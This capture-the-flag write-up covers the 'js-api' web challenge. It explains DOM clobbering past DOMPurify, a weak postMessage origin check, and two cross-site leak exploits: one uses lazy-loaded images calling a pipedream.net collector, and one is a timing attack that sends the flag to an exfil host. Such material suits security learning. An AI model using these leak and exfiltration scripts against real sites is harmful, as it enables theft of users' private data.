@@ -1,0 +1,348 @@
+<h1>js-api</h1>
+
+<h2>Description</h2>
+
+<blockquote>
+  <p>We hired a new developer @sohomdatta1, dude coded something, we sent it for a security audit, it came back a sea of red :(</p>
+</blockquote>
+
+<h2>Solution</h2>
+
+<p>This challenge had the same premise as <a href="undocumented-js-api.md">Undocumented js-api</a>. This time, the JavaScript source is different (and slightly more complex).</p>
+
+<p>```javascript
+window.addEventListener('load', async () =&gt; {</p>
+
+<pre><code>function NOTREACHED() {
+    // destroy currently availiable data
+    // Challenge Author (sohom): 
+    // if you are hitting this codepath repeatedly
+    // please use a incognito window, your ad-blocker
+    // or other extensions might be sending spurious postMessages
+    // to this page
+    window.location.href = `https://www.youtube.com/watch?v=FtutLA63Cp8`
+}
+
+function escapeHtml(unsafe) {
+    return unsafe
+     .replace(/&amp;/g, "&amp;amp;")
+     .replace(/&lt;/g, "&amp;lt;")
+     .replace(/&gt;/g, "&amp;gt;")
+     .replace(/"/g, "&amp;quot;")
+     .replace(/'/g, "&amp;#039;");
+}
+
+
+
+class NotesManager {
+    constructor() {
+        this.noteData = window.localStorage.getItem( 'note' ) || '';
+        this.noteTextArea = document.querySelector( '#note-text-area' );
+        this.noteTextArea.value = this.noteData;
+        this.previewNode = document.querySelector( '#output' );
+        this.highlightNode = document.querySelector( '#note-search-highlights' )
+        this.noteManager = this;
+    }
+
+    static getCurrentNoteManager() {
+        if ( !this.noteManager ) {
+            this.noteManager = new NotesManager();
+        }
+        return this.noteManager;
+    }
+
+    getNotesTextAreaValue() {
+        return this.noteTextArea.value
+    }
+
+    get() {
+        return this.noteData.toString();
+    }
+
+    set(text) {
+        if ( typeof text !== 'string' ) return;
+        const cleanedText = DOMPurify.sanitize(text);
+        this.noteData = cleanedText;
+        window.localStorage.setItem( 'note', cleanedText.toString() ); 
+    }
+
+    /**
+     * Previews text, if text is null will preview existing note
+     * @param {String} [text] String to preview
+     */
+    preview(text) {
+        if ( typeof text !== 'string' &amp;&amp; !!text ) return;
+        if ( !text ) text = this.noteData;
+        else text = DOMPurify.sanitize( text );
+        this.previewNode.innerHTML = text;
+    }
+
+    /**
+     * Search for the particular text
+     * @param {String} text text to search for
+     */
+    search(text) {
+        if ( typeof text !== 'string' ) return;
+        if ( !window.enable_experimental_features ) return;
+        // TODO(sohom): Address concerns raised by our internal security
+        // team regarding this API at b/1337. Given that this API
+        // is effectively a no-op and is not current exposed anywhere
+        // as of version 0.0.1 it should be fine for now.
+        // Since our internal bug tracker is well, "internal"
+        // I have dumped relevant portion of the b/1337 at
+        // https://github.com/sohomdatta1/jsapi-issues/issues/1
+        text = DOMPurify.sanitize( text );
+        const doesMatch = this.noteData.includes(text);
+        if ( doesMatch ) {
+            var lastIndex = 0, i = 0;
+            for(var i = this.noteData.substring(i).indexOf(text); i &lt; this.noteData.length; i = i + text.length + this.noteData.substring(i + text.length).indexOf(text)) {
+                if ( lastIndex &gt; i ) break;
+                this.highlightNode.innerHTML += escapeHtml( this.noteData.substring(lastIndex,i) );
+                this.highlightNode.innerHTML += `&lt;mark&gt;${escapeHtml( text ) }&lt;/mark&gt;`
+                lastIndex = i + text.length;
+            }
+            document.querySelector( '#note-text-highlight-wrapper' ).classList.remove( 'hidden' );
+        }
+    }
+}
+
+// initialize the document
+NotesManager.getCurrentNoteManager();
+NotesManager.getCurrentNoteManager().preview();
+
+window.document.querySelector( '#note-submit' ).addEventListener( 'click', (e) =&gt; {
+    e.preventDefault();
+    const nm = NotesManager.getCurrentNoteManager();
+
+    nm.set( nm.getNotesTextAreaValue() );
+    nm.preview();
+} );
+
+window.document.querySelector( '#note-save' ).addEventListener( 'click', (e) =&gt; {
+    e.preventDefault();
+    const nm = NotesManager.getCurrentNoteManager();
+
+    nm.set( nm.getNotesTextAreaValue() );
+} );
+
+window.document.querySelector( '#note-render' ).addEventListener( 'click', (e) =&gt; {
+    e.preventDefault();
+    const nm = NotesManager.getCurrentNoteManager();
+
+    nm.preview( nm.getNotesTextAreaValue() );
+} );
+
+/**
+ * @experimental Added in 0.0.2
+ */
+window.addEventListener( 'message', (e) =&gt; {
+    if ( !e.origin.endsWith('jsapi.tech') ) return;
+    const data = e.data;
+    if ( typeof data !== 'object' &amp;&amp; typeof data.op !== 'string' &amp;&amp; typeof data.payload !== 'string' ) return;
+    if ( data.op === 'preview' ) {
+        NotesManager.getCurrentNoteManager().preview( data.payload );
+    } else if ( data.op === 'set' ) {
+        NotesManager.getCurrentNoteManager().set( data.payload );
+    } else if ( data.op === 'search' ) {
+        NotesManager.getCurrentNoteManager().search( data.payload );
+    } else {
+        NOTREACHED();
+    }
+} );
+</code></pre>
+
+<p>});
+```</p>
+
+<p>The important part is, once again, the message event handler. Just like the previous challenge, we had to use a subdomain takeover to serve an exploit page from a <code>.jsapi.tech</code> subdomain.</p>
+
+<p><code>javascript
+window.addEventListener( 'message', (e) =&gt; {
+    if ( !e.origin.endsWith('jsapi.tech') ) return;
+    const data = e.data;
+    if ( typeof data !== 'object' &amp;&amp; typeof data.op !== 'string' &amp;&amp; typeof data.payload !== 'string' ) return;
+    if ( data.op === 'preview' ) {
+        NotesManager.getCurrentNoteManager().preview( data.payload );
+    } else if ( data.op === 'set' ) {
+        NotesManager.getCurrentNoteManager().set( data.payload );
+    } else if ( data.op === 'search' ) {
+        NotesManager.getCurrentNoteManager().search( data.payload );
+    } else {
+        NOTREACHED();
+    }
+} );
+</code></p>
+
+<p>One interesting feature in this version of the challenge is that we can "preview" our HTML <em>without saving it</em>. Everything is still sanitized through DOMPurify.</p>
+
+<p><code>javascript
+/**
+ * Previews text, if text is null will preview existing note
+ * @param {String} [text] String to preview
+ */
+preview(text) {
+    if ( typeof text !== 'string' &amp;&amp; !!text ) return;
+    if ( !text ) text = this.noteData;
+    else text = DOMPurify.sanitize( text );
+    this.previewNode.innerHTML = text;
+}
+</code></p>
+
+<p>In the preview feature, we can insert sanitized HTML without changing <code>this.noteData</code>. When using the search feature, the original <code>this.noteData</code> is the one being searched for our input text.</p>
+
+<p><code>javascript
+/**
+ * Search for the particular text
+ * @param {String} text text to search for
+ */
+search(text) {
+    if ( typeof text !== 'string' ) return;
+    if ( !window.enable_experimental_features ) return;
+    // TODO(sohom): Address concerns raised by our internal security
+    // team regarding this API at b/1337. Given that this API
+    // is effectively a no-op and is not current exposed anywhere
+    // as of version 0.0.1 it should be fine for now.
+    // Since our internal bug tracker is well, "internal"
+    // I have dumped relevant portion of the b/1337 at
+    // https://github.com/sohomdatta1/jsapi-issues/issues/1
+    text = DOMPurify.sanitize( text );
+    const doesMatch = this.noteData.includes(text);
+    if ( doesMatch ) {
+        var lastIndex = 0, i = 0;
+        for(var i = this.noteData.substring(i).indexOf(text); i &lt; this.noteData.length; i = i + text.length + this.noteData.substring(i + text.length).indexOf(text)) {
+            if ( lastIndex &gt; i ) break;
+            this.highlightNode.innerHTML += escapeHtml( this.noteData.substring(lastIndex,i) );
+            this.highlightNode.innerHTML += `&lt;mark&gt;${escapeHtml( text ) }&lt;/mark&gt;`
+            lastIndex = i + text.length;
+        }
+        document.querySelector( '#note-text-highlight-wrapper' ).classList.remove( 'hidden' );
+    }
+}
+</code></p>
+
+<p>The search feature checks for <code>window.enable_experimental_features</code>, which is a property that doesn't exist... or does it?</p>
+
+<p>DOMPurify doesn't protect against DOM clobbering, so we can pollute this property by inserting the following HTML through the preview feature.</p>
+
+<p><code>html
+&lt;a href="asdf" id="enable_experimental_features"&gt;CLOBBERED&lt;/a&gt;
+</code></p>
+
+<h3>Unintended Solution</h3>
+
+<p>When the text that we are searching is found in the victim's note, a new <code>&lt;div&gt;</code> is rendered with the search results (<code>#note-text-highlight-wrapper</code> has its <code>hidden</code> class removed).</p>
+
+<p>For instance, the following shows a correct search (where the searched content is a substring of the flag).</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2022-12-29 at 3.51.43 AM (2).png" alt=""><figcaption></figcaption></figure>
+
+<p>And the following shows an incorrect search, where no matches are found. Notice how the extra <code>&lt;div&gt;</code> in the correct search was sufficient to push the previewed content out of the viewport.</p>
+
+<figure><img src="../../.gitbook/assets/Screenshot 2022-12-29 at 3.55.53 AM.png" alt=""><figcaption></figcaption></figure>
+
+<p>We can make use of <a href="https://web.dev/browser-level-image-lazy-loading/">image lazy loading</a> to only load an image if it is within the browser viewport. This way, we are able to tell if the results section was rendered.</p>
+
+<p><code>markup
+&lt;a href="asdf" id="enable_experimental_features"&gt;CLOBBERED&lt;/a&gt;
+&lt;img src="https://EXFIL.x.pipedream.net?nope=${CURR_FLAG + char}" loading="lazy"&gt;
+</code></p>
+
+<p>If we do <em>not</em> receive a request for a particular character, that means that the results section was rendered, and therefore the search was a correct guess.</p>
+
+<p>The following script implements this exploit.</p>
+
+<p>```javascript
+const sleep = (milliseconds) =&gt; {
+    return new Promise(resolve =&gt; setTimeout(resolve, milliseconds))
+}</p>
+
+<p>(async () =&gt; {
+    const CURR<em>FLAG = "nite{hello</em>longtasktimingapi<em>3a2c53"
+    const CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789</em>}"</p>
+
+<pre><code>for (let char of CHARSET) {
+    const frame = document.createElement("iframe")
+    frame.width = "100%"
+    frame.height = "100%"
+    frame.src = "https://challenge.jsapi.tech"
+    document.body.appendChild(frame)
+
+    await sleep(500);
+
+    frame.contentWindow.postMessage(
+        {
+            op: "preview",
+            payload: `&lt;a href="asdf" id="enable_experimental_features"&gt;CLOBBERED&lt;/a&gt;&lt;img src="https://enrueq28ozwok.x.pipedream.net?nope=${CURR_FLAG + char}" loading="lazy"&gt;`
+        },
+        "*"
+    )
+    frame.contentWindow.postMessage(
+        {
+            op: "search",
+            payload: CURR_FLAG + char
+        },
+        "*"
+    )
+
+    await sleep(500);
+
+    frame.remove()
+}
+</code></pre>
+
+<p>})()
+```</p>
+
+<h3>Intended Solution</h3>
+
+<p>The intended solution was to use the <a href="https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming">PerformanceLongTaskTiming API</a> to identify if the search was taking more than 50ms.</p>
+
+<p>It turns out, however, any timing attack with <code>performance.now()</code> would have worked as well.</p>
+
+<p>Because the JavaScript event loop is single-threaded, we just need to use <code>setTimeout</code> to temporarily pass control to the next thing in the callback queue (which is the message handler taking care of the <code>search</code> request), then find out how long it took for control to be passed <em>back</em> to our exploit script.</p>
+
+<p>Although the <code>setTimeout</code> is only for 1ms, it takes much longer in reality for execution to resume because the expensive <code>search</code> function blocks the event loop. By measuring this discrepancy, we can find out if our guess was correct.</p>
+
+<p>```javascript
+const sleep = (ms) =&gt; new Promise((res) =&gt; setTimeout(res, ms));</p>
+
+<p>async function check(flag) {
+    let w = frame.contentWindow;
+    w.postMessage({'op': 'preview', 'payload': '<img name="enable_experimental_features">'}, '<em>');
+    await sleep(1);
+    w.postMessage({'op': 'search', 'payload': flag}, '</em>');
+    let t1 = performance.now();
+    await sleep(1);
+    return (performance.now() - t1) &gt; 200;
+}</p>
+
+<p>async function main() {
+    let alpha = 'abcdefghijklmnopqrstuvwxyz0123456789_ABCDEFGHIJKLMNOPQRSTUVWXYZ-}';
+    window.frame = document.createElement('iframe');
+    frame.width = '100%';
+    frame.height = '700px';
+    frame.src = 'https://challenge.jsapi.tech/';
+    document.body.appendChild(frame);
+    await sleep(1000);</p>
+
+<pre><code>let flag = 'nite{';
+while(1) {
+    for(let c of alpha) {
+        let result = await Promise.race([
+            check(flag + c),
+            new Promise((res) =&gt; setTimeout(() =&gt; { res(true); }, 300))
+        ]);
+        console.log(flag + c, result);
+        if(result) {
+            flag += c;
+            break;
+        }
+    }
+    new Image().src = '//exfil.host/log?' + encodeURIComponent(flag);
+}
+</code></pre>
+
+<p>}</p>
+
+<p>document.addEventListener('DOMContentLoaded', main);
+```</p>
